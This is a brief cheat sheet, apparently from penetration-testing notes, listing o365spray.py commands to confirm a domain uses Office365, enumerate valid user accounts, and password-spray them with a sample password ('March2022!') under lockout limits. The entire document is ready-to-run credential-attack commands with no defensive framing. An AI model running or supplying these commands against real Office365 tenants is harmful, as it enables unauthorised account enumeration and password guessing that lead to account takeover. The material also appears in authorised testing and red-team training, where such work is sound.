# Office365

## Bruteforce office 365



| Command                                                                                                         | Description                                                                            |
| --------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| `python3 o365spray.py --validate --domain msplaintext.xyz`                                                      | Verify the usage of Office365 for the specified domain.                                |
| `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`                                             | Enumerate existing users using Office365 on the specified domain.                      |
| `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz` | Password spraying against a list of users that use Office365 for the specified domain. |
